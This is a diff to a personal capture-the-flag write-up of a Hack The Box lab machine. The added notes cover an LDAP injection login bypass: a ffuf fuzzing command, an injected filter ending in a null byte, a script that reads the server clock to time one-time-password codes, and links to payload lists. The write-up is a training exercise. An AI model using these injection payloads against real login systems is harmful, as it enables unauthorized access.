@@ -128,10 +128,10 @@ sudo tcpdump -nvvvXi tun0 tcp port 80
 
 ![](andwewaitandgetthetoken.png)
 
-```
+```python
 285449490011357156531651545652335570713167411445727140604172141456711102716717000
+# Double Check
 ```
-
 
 
 ```python
@@ -180,7 +180,7 @@ ffuf -u 'http://ctf.htb/param=*)(FUZZ=*' -c -w /usr/share/seclists/Fuzzing/$LDAP
 ```
 https://stackoverflow.com/questions/9450446/how-do-i-use-a-c-style-for-loop-in-python
 
-THIS DOEES NOT WORK, but I learnt alot about LDAP injections and python reminders from doing this 
+THIS DOES NOT WORK, but I learnt alot about LDAP injections and python reminders from doing this 
 ```python
 import requests
 import logging as log
@@ -265,10 +265,61 @@ sudo apt install stoken
 stoken --token=$token
 ```
 
-OTP are time sensitive and therefore to finish this I need to change the VM time.
+OTP are time sensitive and therefore to finish this I need to change the VM time. This is the wrong date - I am a idiot...
+![1080](datechange.png)
+So I tried again also getting as close to t eh second as possible, but it still failed.
+![](correctdatereturnofthefool.png)
 
-https://www.youtube.com/watch?v=51JQg202csw
+We need to terminate the query to log in so that the second query does not trigger. This 
+```csharp
+// LDAP the query is 1st in the syntax
+(&
+	(&
+		(password=IppsecRocks)
+		(username=GoSubscribeToIppsec)))%00
+		($attribute=* // use the wildcard character to get all LDAP attribute - LDAP injection (application closes the `)` )
+	)
+	(|
+		(group=adm)
+		(group=root)
+	)
+)
+```
 
+I accidentally did this without the OTP and succeeded: 
+![](nootpbutthereyougo.png)
+
+Then I could not log in... then again with this awesome script after I got the official writeup give the forty minutes of attempts..
+![](ineverreachforpython.png)
+I think that a weakness of mine is not reaching for python as I just have so many problems with tab indentation, previous successes and failures and being generally burnt on python 2,3 ... just another reminder of that.
+```python
+#!/usr/bin/python
+from requests import get
+from datetime import datetime
+url = 'http://10.10.10.122'
+res = get(url)
+date = res.headers['Date']
+pattern = '%a, %d %b %Y %H:%M:%S GMT'
+obj = datetime.strptime( date, pattern )
+diff = datetime.utcnow() - datetime.now()
+print int(obj.strftime('%s')) - int(diff.total_seconds())
+```
+
+No tabs with the copy and paste.
+
+Key takeaways:
+- Similar to SQL injections, LDAP injection guess the query and have the visual syntax written in front of you will aid in closing the query preemptively.
+- Browsers will URL encode, which seems obvious just not when you are holding different contexts of burp and browser
+- Even though I can hack time, I cannot seem to sync time between two remote VMs like everyone else lmao..
+- Time sensitive logins are worse than Unix-Windows time syncing.
+- I was just so focused that I am not taking a mental step back.
+- Add *"If its not quotes, etc..."* ... is it time-sensitive or are you temporally-synchronised?
+	- ..time
+
+LDAP Injection:
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP_Injection
+-  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP_Injection/Intruder/LDAP_FUZZ.txt
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP_Injection/Intruder/LDAP_attributes.txt
 ## Foothold
 
 ## Privilege Escalation
@@ -277,7 +328,7 @@ https://www.youtube.com/watch?v=51JQg202csw
 
 ## Beyond Root
 
-
-- Adapt the script
+- Tried to adapt the hacksmarter script.
+- Adapt the get the remote time script 
 - LDAP page in Archive complete
 - CIA tradecraft-to-brainzcraft
